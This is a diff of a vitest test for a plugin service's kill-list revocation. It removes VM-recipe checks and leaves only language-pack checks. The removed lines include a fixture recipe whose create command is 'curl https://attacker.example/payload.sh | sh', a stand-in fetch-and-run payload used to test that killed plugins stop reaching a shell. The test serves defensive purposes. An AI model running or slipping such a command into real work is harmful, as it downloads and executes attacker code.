@@ -4,29 +4,24 @@ import { join } from 'node:path'
 import { afterEach, describe, expect, it } from 'vitest'
 import { fingerprintPluginConsent } from '../../shared/plugins/plugin-consent-fingerprint'
 import { pluginManifestSchema, type PluginManifest } from '../../shared/plugins/plugin-manifest'
-import { getApprovedPluginVmRecipes } from './plugin-approved-vm-recipes'
 import { PluginService } from './plugin-service'
 import { hashPluginTree } from './plugin-content-hash'
 
-/** A kill-listed plugin's declarative content must stop reaching the runtime:
- *  VM recipe `create` strings are executed through spawn(..., { shell: true }). */
-
 const roots: string[] = []
 const services: PluginService[] = []
-const pluginKey = 'orca-samples.recipes'
+const pluginKey = 'orca-samples.content'
 
 function contentManifest(): PluginManifest {
   return pluginManifestSchema.parse({
     manifestVersion: 1,
-    id: 'recipes',
+    id: 'content',
     publisher: 'orca-samples',
-    name: 'Recipes',
+    name: 'Content',
     version: '1.0.0',
     engines: { orca: '>=1.0.0' },
     pluginApi: 1,
     contributes: {
-      languagePacks: [{ locale: 'es', path: 'locales/es.json' }],
-      vmRecipes: [{ path: 'recipes/vm.json' }]
+      languagePacks: [{ locale: 'es', path: 'locales/es.json' }]
     },
     capabilities: []
   })
@@ -35,19 +30,10 @@ function contentManifest(): PluginManifest {
 async function pluginRoot(): Promise<string> {
   const root = await mkdtemp(join(tmpdir(), 'orca-plugin-kill-content-'))
   roots.push(root)
-  await Promise.all([mkdir(join(root, 'locales')), mkdir(join(root, 'recipes'))])
+  await mkdir(join(root, 'locales'))
   await Promise.all([
     writeFile(join(root, 'orca-plugin.json'), JSON.stringify(contentManifest())),
-    writeFile(join(root, 'locales', 'es.json'), JSON.stringify({ settings: 'Ajustes' })),
-    writeFile(
-      join(root, 'recipes', 'vm.json'),
-      JSON.stringify({
-        schemaVersion: 1,
-        id: 'killed-recipe',
-        name: 'Killed Recipe',
-        create: 'curl https://attacker.example/payload.sh | sh'
-      })
-    )
+    writeFile(join(root, 'locales', 'es.json'), JSON.stringify({ settings: 'Ajustes' }))
   ])
   return root
 }
@@ -79,17 +65,14 @@ afterEach(async () => {
 })
 
 describe('kill-list revocation of declarative plugin content', () => {
-  it('withdraws VM recipes and language packs when a live plugin is killed', async () => {
+  it('withdraws language packs when a live plugin is killed', async () => {
     const root = await pluginRoot()
     let killed = false
     const service = await createService(root, () => killed)
     await service.initialize()
-    expect(await getApprovedPluginVmRecipes(service)).toHaveLength(1)
-
     killed = true
     await service.reconcileActivationState()
 
-    expect(await getApprovedPluginVmRecipes(service)).toEqual([])
     expect(service.contentPacks.languagePacks.list()).toEqual([])
   })
 
@@ -99,7 +82,6 @@ describe('kill-list revocation of declarative plugin content', () => {
 
     await service.initialize()
 
-    expect(await getApprovedPluginVmRecipes(service)).toEqual([])
     expect(service.contentPacks.languagePacks.list()).toEqual([])
   })
 })
